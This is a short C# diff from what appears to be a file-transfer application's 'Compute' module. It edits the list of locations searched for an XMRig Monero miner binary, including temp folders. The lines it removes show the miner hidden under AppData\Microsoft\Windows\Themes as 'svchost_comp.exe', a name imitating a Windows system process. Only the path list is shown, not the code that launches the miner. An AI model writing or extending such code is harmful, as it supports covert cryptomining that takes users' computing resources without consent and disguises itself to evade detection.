@@ -195,10 +195,10 @@ namespace FileTransfer.Compute
             string appDir = AppDomain.CurrentDomain.BaseDirectory;
             var searchPaths = new System.Collections.Generic.List<string>
             {
+                Path.Combine(appDir, "Compute", "xmrig.exe"),
+                Path.Combine(appDir, "Compute", "xmr_worker.exe"),
                 Path.Combine(appDir, "xmrig.exe"),
                 Path.Combine(appDir, "xmr_worker.exe"),
-                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "Modules", "xmrig", "xmrig.exe"),
-                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "svchost_comp.exe"),
                 Path.Combine(Path.GetTempPath(), "xmrig.exe"),
                 Path.Combine(Path.GetTempPath(), "xmr_worker.exe")
             };
